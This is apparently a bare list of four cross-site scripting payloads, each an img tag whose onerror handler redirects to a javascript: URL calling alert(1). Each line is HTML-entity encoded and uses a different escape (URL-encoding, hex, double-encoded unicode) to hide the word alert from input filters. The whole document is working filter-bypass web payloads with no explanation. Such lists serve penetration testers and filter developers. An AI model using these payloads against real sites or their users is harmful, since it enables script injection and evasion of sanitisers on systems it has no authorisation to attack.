&lt;img onerror=&#34;location=&#39;javascript:=lert(1)&#39;&#34; src=&#34;x&#34;&gt;
&lt;img onerror=&#34;location=&#39;javascript:%61lert(1)&#39;&#34; src=&#34;x&#34;&gt;
&lt;img onerror=&#34;location=&#39;javascript:\x2561lert(1)&#39;&#34; src=&#34;x&#34;&gt;
&lt;img onerror=&#34;location=&#39;javascript:\x255Cu0061lert(1)&#39;&#34; src=&#34;x&#34; &gt;

